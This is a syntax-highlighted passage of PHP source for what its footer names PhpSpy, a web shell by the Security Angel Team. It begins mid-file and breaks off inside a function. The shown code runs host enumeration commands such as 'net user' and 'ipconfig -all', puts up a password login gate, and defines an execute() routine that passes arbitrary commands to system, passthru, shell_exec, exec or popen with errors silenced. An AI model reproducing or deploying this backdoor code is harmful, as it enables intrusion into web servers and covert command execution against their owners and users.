<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">secparam(</span><span style="color: #3e999f;">'Account Settings'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">execute(</span><span style="color: #3e999f;">'net accounts'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">secparam(</span><span style="color: #3e999f;">'User Accounts'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">execute(</span><span style="color: #3e999f;">'net user'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">secparam(</span><span style="color: #3e999f;">'IP Configurate'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">execute(</span><span style="color: #3e999f;">'ipconfig -all'</span>));
<span style="background-color: #d6d6d6;"> </span>   }
}<span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">end</span>

<span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(</span><span style="color: #3e999f;">'Undefined Action'</span>);
}

<span style="color: #8959a8;">?&gt;</span>
<span style="color: #4271ae;">&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span>
<span style="color: #4271ae;">&lt;div</span> <span style="color: #4271ae;">style=</span><span style="color: #3e999f;">"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;</span><span style="color: #3e999f; text-decoration: underline;">background:#eee;"</span><span style="color: #4271ae; text-decoration: underline;">&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;span</span> <span style="color: #4271ae;">style=</span><span style="color: #3e999f;">"float:right;"</span><span style="color: #4271ae;">&gt;</span><span style="color: #8959a8;">&lt;?php</span> <span style="color: #4d4d4c; background-color: #ffffff;">debuginfo(</span>);<span style="color: #4d4d4c; background-color: #ffffff;">ob_end_flush(</span>);<span style="color: #8959a8;">?&gt;</span><span style="color: #4271ae;">&lt;/span&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #c82829; font-weight: bold;">Powered</span> <span style="color: #c82829; font-weight: bold;">by</span> <span style="color: #4271ae;">&lt;a</span> <span style="color: #4271ae;">title=</span><span style="color: #3e999f;">"Build 20110502"</span> <span style="color: #4271ae;">href=</span><span style="color: #3e999f;">"http://www.4ngel.net"</span> <span style="color: #4271ae;">target=</span><span style="color: #3e999f;">"_bl</span><span style="color: #3e999f; text-decoration: underline;">ank"</span><span style="color: #4271ae; text-decoration: underline;">&gt;</span><span style="color: #8959a8; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #718c00; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> </span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">str_replace(</span><span style="color: #3e999f; text-decoration: underline;">'.'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">''</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'P.h.p.S.p.y'</span><span style="text-decoration: underline;">);</span><span style="color: #8959a8; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;"> </span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">2011</span><span style="color: #4271ae; text-decoration: underline;">&lt;/a&gt;</span><span style="text-decoration: underline;">. </span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">Copyright (</span><span style="color: #c82829; font-weight: bold; text-decoration: underline;">C</span><span style="text-decoration: underline;">) </span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">2004</span><span style="text-decoration: underline;">-</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">2011</span><span style="text-decoration: underline;"> </span><span style="color: #4271ae; text-decoration: underline;">&lt;a</span><span style="text-decoration: underline;"> </span><span style="color: #4271ae; text-decoration: underline;">href=</span><span style="color: #3e999f; text-decoration: underline;">"http://www.4ngel.net"</span><span style="text-decoration: underline;"> </span><span style="color: #4271ae; text-decoration: underline;">target=</span><span style="color: #3e999f; text-decoration: underline;">"_blank"</span><span style="color: #4271ae; text-decoration: underline;">&gt;</span><span style="color: #c82829; font-weight: bold; text-decoration: underline;">Security</span><span style="text-decoration: underline;"> </span><span style="color: #c82829; font-weight: bold; text-decoration: underline;">Angel</span><span style="text-decoration: underline;"> </span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">Team [</span><span style="color: #c82829; font-weight: bold; text-decoration: underline;">S4T</span><span style="text-decoration: underline;">]</span><span style="color: #4271ae; text-decoration: underline;">&lt;/a&gt;</span><span style="text-decoration: underline;"> </span><span style="color: #c82829; font-weight: bold; text-decoration: underline;">All</span><span style="text-decoration: underline;"> </span><span style="color: #c82829; font-weight: bold; text-decoration: underline;">Rights</span><span style="text-decoration: underline;"> </span><span style="color: #c82829; font-weight: bold; text-decoration: underline;">Reserved</span><span style="text-decoration: underline;">.</span>
<span style="color: #4271ae;">&lt;/div&gt;</span>
<span style="color: #4271ae;">&lt;/body&gt;</span>
<span style="color: #4271ae;">&lt;/html&gt;</span>

<span style="color: #8959a8;">&lt;?php</span>

<span style="color: #8e908c; font-style: italic;">/*</span><span style="color: #8e908c; font-style: italic;">======================================================</span>
<span style="color: #8e908c; font-style: italic;">&#20989;&#25968;&#24211;</span>
<span style="color: #8e908c; font-style: italic;">======================================================*/</span>

<span style="color: #718c00;">function</span> <span style="color: #f5871f;">secparam</span>($<span style="color: #eab700;">n</span>, $<span style="color: #eab700;">v</span>) {
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">v</span> = <span style="color: #4d4d4c; background-color: #ffffff;">trim(</span>$<span style="color: #eab700;">v</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>($<span style="color: #eab700;">v</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;h2&gt;'</span>.$<span style="color: #eab700;">n</span>.<span style="color: #3e999f;">' &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;div class="infolist"&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #4d4d4c; background-color: #ffffff;">strpos(</span>$<span style="color: #eab700;">v</span>, <span style="color: #3e999f;">"\n"</span>) === <span style="color: #4271ae;">false</span>)
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span>$<span style="color: #eab700;">v</span>.<span style="color: #3e999f;">'&lt;br /&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">else</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;pre&gt;'</span>.$<span style="color: #eab700;">v</span>.<span style="color: #3e999f;">'&lt;/pre&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/div&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   }
}
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">m</span>($<span style="color: #eab700;">msg</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">echo</span> <span style="color: #3e999f;">'&lt;div style="margin:10px auto 15px auto;background:#ffffe0;border:1px s</span><span style="color: #3e999f; text-decoration: underline;">olid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;"&gt;'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">echo</span> $<span style="color: #eab700;">msg</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">echo</span> <span style="color: #3e999f;">'&lt;/div&gt;'</span>;
}
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">scookie</span>($<span style="color: #eab700;">key</span>, $<span style="color: #eab700;">value</span>, $<span style="color: #eab700;">life</span> = <span style="color: #4d4d4c; background-color: #ffffff;">0</span>, $<span style="color: #eab700;">prefix</span> = <span style="color: #4d4d4c; background-color: #ffffff;">1</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">global</span> $<span style="color: #eab700;">timestamp</span>, $<span style="color: #4271ae;">_SERVER</span>, $<span style="color: #eab700;">cookiepre</span>, $<span style="color: #eab700;">cookiedomain</span>, $<span style="color: #eab700;">cookiepath</span>, $<span style="color: #eab700;">cookie</span><span style="color: #eab700; text-decoration: underline;">life</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">key</span> = ($<span style="color: #eab700;">prefix</span> ? $<span style="color: #eab700;">cookiepre</span> : <span style="color: #3e999f;">''</span>).$<span style="color: #eab700;">key</span>;
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">life</span> = $<span style="color: #eab700;">life</span> ? $<span style="color: #eab700;">life</span> : $<span style="color: #eab700;">cookielife</span>;
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">useport</span> = $<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">'SERVER_PORT'</span>] == <span style="color: #4d4d4c; background-color: #ffffff;">443</span> ? <span style="color: #4d4d4c; background-color: #ffffff;">1</span> : <span style="color: #4d4d4c; background-color: #ffffff;">0</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">setcookie(</span>$<span style="color: #eab700;">key</span>, $<span style="color: #eab700;">value</span>, $<span style="color: #eab700;">timestamp</span>+$<span style="color: #eab700;">life</span>, $<span style="color: #eab700;">cookiepath</span>, $<span style="color: #eab700;">cookiedomain</span>, $<span style="color: #eab700;">usepo</span><span style="color: #eab700; text-decoration: underline;">rt</span><span style="text-decoration: underline;">);</span>
}<span style="color: #c82829; background-color: #d6d6d6;">   </span>
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">multi</span>($<span style="color: #eab700;">num</span>, $<span style="color: #eab700;">perpage</span>, $<span style="color: #eab700;">curpage</span>, $<span style="color: #eab700;">tablename</span>) {
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">multipage</span> = <span style="color: #3e999f;">''</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>($<span style="color: #eab700;">num</span> &gt; $<span style="color: #eab700;">perpage</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">page</span> = <span style="color: #4d4d4c; background-color: #ffffff;">10</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">offset</span> = <span style="color: #4d4d4c; background-color: #ffffff;">5</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">pages</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">ceil(</span>$<span style="color: #eab700;">num</span> / $<span style="color: #eab700;">perpage</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>($<span style="color: #eab700;">page</span> &gt; $<span style="color: #eab700;">pages</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">from</span> = <span style="color: #4d4d4c; background-color: #ffffff;">1</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">to</span> = $<span style="color: #eab700;">pages</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">from</span> = $<span style="color: #eab700;">curpage</span> - $<span style="color: #eab700;">offset</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">to</span> = $<span style="color: #eab700;">curpage</span> + $<span style="color: #eab700;">page</span> - $<span style="color: #eab700;">offset</span> - <span style="color: #4d4d4c; background-color: #ffffff;">1</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>($<span style="color: #eab700;">from</span> &lt; <span style="color: #4d4d4c; background-color: #ffffff;">1</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">to</span> = $<span style="color: #eab700;">curpage</span> + <span style="color: #4d4d4c; background-color: #ffffff;">1</span> - $<span style="color: #eab700;">from</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">from</span> = <span style="color: #4d4d4c; background-color: #ffffff;">1</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(($<span style="color: #eab700;">to</span> - $<span style="color: #eab700;">from</span>) &lt; $<span style="color: #eab700;">page</span> &amp;&amp; ($<span style="color: #eab700;">to</span> - $<span style="color: #eab700;">from</span>) &lt; $<span style="color: #eab700;">pages</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">to</span> = $<span style="color: #eab700;">page</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">elseif</span>($<span style="color: #eab700;">to</span> <span style="color: #4271ae;">&gt;</span> $<span style="color: #eab700;">pages</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">from</span> = $<span style="color: #eab700;">curpage</span> - $<span style="color: #eab700;">pages</span> + $<span style="color: #eab700;">to</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">to</span> = $<span style="color: #eab700;">pages</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(($<span style="color: #eab700;">to</span> - $<span style="color: #eab700;">from</span>) &lt; $<span style="color: #eab700;">page</span> &amp;&amp; ($<span style="color: #eab700;">to</span> - $<span style="color: #eab700;">from</span>) &lt; $<span style="color: #eab700;">pages</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">from</span> = $<span style="color: #eab700;">pages</span> - $<span style="color: #eab700;">page</span> + <span style="color: #4d4d4c; background-color: #ffffff;">1</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">multipage</span> = ($<span style="color: #eab700;">curpage</span> - $<span style="color: #eab700;">offset</span> <span style="color: #4271ae;">&gt;</span> <span style="color: #4d4d4c; background-color: #ffffff;">1</span> &amp;&amp; $<span style="color: #eab700;">pages</span> &gt; $<span style="color: #eab700;">page</span> ? <span style="color: #3e999f;">'&lt;a href="javas</span><span style="color: #3e999f; text-decoration: underline;">cript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'\', \'\', 1);"&gt;First&lt;/a&gt; '</span><span style="text-decoration: underline;"> : </span><span style="color: #3e999f; text-decoration: underline;">''</span><span style="text-decoration: underline;">).($</span><span style="color: #eab700; text-decoration: underline;">curpage</span><span style="text-decoration: underline;"> &gt; </span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">1</span><span style="text-decoration: underline;"> ? </span><span style="color: #3e999f; text-decoration: underline;">'&lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'\', \'\', '</span><span style="text-decoration: underline;">.($</span><span style="color: #eab700; text-decoration: underline;">curpage</span><span style="text-decoration: underline;"> - </span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">1</span><span style="text-decoration: underline;">).</span><span style="color: #3e999f; text-decoration: underline;">');"&gt;Prev&lt;/a&gt; '</span><span style="text-decoration: underline;"> : </span><span style="color: #3e999f; text-decoration: underline;">''</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">for</span>($<span style="color: #eab700;">i</span> = $<span style="color: #eab700;">from</span>; $<span style="color: #eab700;">i</span> &lt;= $<span style="color: #eab700;">to</span>; $<span style="color: #eab700;">i</span>++) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">multipage</span> .= $<span style="color: #eab700;">i</span> == $<span style="color: #eab700;">curpage</span> ? $<span style="color: #eab700;">i</span>.<span style="color: #3e999f;">' '</span> : <span style="color: #3e999f;">'&lt;a href="javascript:settabl</span><span style="color: #3e999f; text-decoration: underline;">e(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'\', \'\', '</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">i</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">');"&gt;['</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">i</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">']&lt;/a&gt; '</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">multipage</span> .= ($<span style="color: #eab700;">curpage</span> &lt; $<span style="color: #eab700;">pages</span> ? <span style="color: #3e999f;">'&lt;a href="javascript:settable(\''</span>.$<span style="color: #eab700;">ta</span><span style="color: #eab700; text-decoration: underline;">blename</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'\', \'\', '</span><span style="text-decoration: underline;">.($</span><span style="color: #eab700; text-decoration: underline;">curpage</span><span style="text-decoration: underline;"> + </span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">1</span><span style="text-decoration: underline;">).</span><span style="color: #3e999f; text-decoration: underline;">');"&gt;Next&lt;/a&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #3e999f; text-decoration: underline;">''</span><span style="text-decoration: underline;">).($</span><span style="color: #eab700; text-decoration: underline;">to</span><span style="text-decoration: underline;"> &lt; $</span><span style="color: #eab700; text-decoration: underline;">pages</span><span style="text-decoration: underline;"> ? </span><span style="color: #3e999f; text-decoration: underline;">' &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'\', \'\', '</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">pages</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">');"&gt;Last&lt;/a&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #3e999f; text-decoration: underline;">''</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">multipage</span> = $<span style="color: #eab700;">multipage</span> ? <span style="color: #3e999f;">'&lt;p&gt;Pages: '</span>.$<span style="color: #eab700;">multipage</span>.<span style="color: #3e999f;">'&lt;/p&gt;'</span> : <span style="color: #3e999f;">''</span>;
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> $<span style="color: #eab700;">multipage</span>;
}
<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#30331;&#38470;&#20837;&#21475;</span>
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">loginpage</span>() {
<span style="color: #8959a8;">?&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;style</span> <span style="color: #4271ae;">type=</span><span style="color: #3e999f;">"text/css"</span><span style="color: #4271ae;">&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #c82829; font-weight: bold;">input</span> {<span style="color: #c82829; font-weight: bold;">font</span>:<span style="color: #4d4d4c; background-color: #ffffff;">11</span>px <span style="color: #c82829; font-weight: bold;">Verdana</span>;<span style="color: #c82829; font-weight: bold;">BACKGROUND</span>: <span style="color: #8e908c; font-style: italic;">#FFFFFF;height: 18px;border: 1px solid </span><span style="color: #8e908c; font-style: italic; text-decoration: underline;">#666666;}</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;/style&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;form</span> <span style="color: #4271ae;">method=</span><span style="color: #3e999f;">"POST"</span> <span style="color: #4271ae;">action=</span><span style="color: #3e999f;">""</span><span style="color: #4271ae;">&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;span</span> <span style="color: #4271ae;">style=</span><span style="color: #3e999f;">"font:11px Verdana;"</span><span style="color: #4271ae;">&gt;</span><span style="color: #c82829; font-weight: bold;">Password</span>: <span style="color: #4271ae;">&lt;/span&gt;&lt;input</span> <span style="color: #4271ae;">name=</span><span style="color: #3e999f;">"password"</span> <span style="color: #4271ae;">typ</span><span style="color: #4271ae; text-decoration: underline;">e=</span><span style="color: #3e999f; text-decoration: underline;">"password"</span><span style="text-decoration: underline;"> </span><span style="color: #4271ae; text-decoration: underline;">size=</span><span style="color: #3e999f; text-decoration: underline;">"20"</span><span style="color: #4271ae; text-decoration: underline;">&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;input</span> <span style="color: #4271ae;">type=</span><span style="color: #3e999f;">"hidden"</span> <span style="color: #4271ae;">name=</span><span style="color: #3e999f;">"action"</span> <span style="color: #4271ae;">value=</span><span style="color: #3e999f;">"login"</span><span style="color: #4271ae;">&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;input</span> <span style="color: #4271ae;">type=</span><span style="color: #3e999f;">"submit"</span> <span style="color: #4271ae;">value=</span><span style="color: #3e999f;">"Login"</span><span style="color: #4271ae;">&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;/form&gt;</span>
<span style="color: #8959a8;">&lt;?php</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">exit</span>;
}<span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">end loginpage()</span>

<span style="color: #718c00;">function</span> <span style="color: #f5871f;">execute</span>($<span style="color: #eab700;">cfe</span>) {
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">res</span> = <span style="color: #3e999f;">''</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">cfe</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #4d4d4c; background-color: #ffffff;">function_exists(</span><span style="color: #3e999f;">'system'</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">ob_start(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">system(</span>$<span style="color: #eab700;">cfe</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">res</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">ob_get_contents(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">ob_end_clean(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">elseif</span>(<span style="color: #4d4d4c; background-color: #ffffff;">function_exists(</span><span style="color: #3e999f;">'passthru'</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">ob_start(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">passthru(</span>$<span style="color: #eab700;">cfe</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">res</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">ob_get_contents(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">ob_end_clean(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">elseif</span>(<span style="color: #4d4d4c; background-color: #ffffff;">function_exists(</span><span style="color: #3e999f;">'shell_exec'</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">res</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">shell_exec(</span>$<span style="color: #eab700;">cfe</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">elseif</span>(<span style="color: #4d4d4c; background-color: #ffffff;">function_exists(</span><span style="color: #3e999f;">'exec'</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">exec(</span>$<span style="color: #eab700;">cfe</span>,$<span style="color: #eab700;">res</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">res</span> = <span style="color: #4d4d4c; background-color: #ffffff;">join(</span><span style="color: #3e999f;">"\n"</span>,$<span style="color: #eab700;">res</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">elseif</span>(@<span style="color: #4d4d4c; background-color: #ffffff;">is_resource(</span>$<span style="color: #eab700;">f</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">popen(</span>$<span style="color: #eab700;">cfe</span>,<span style="color: #3e999f;">"r"</span>))) {
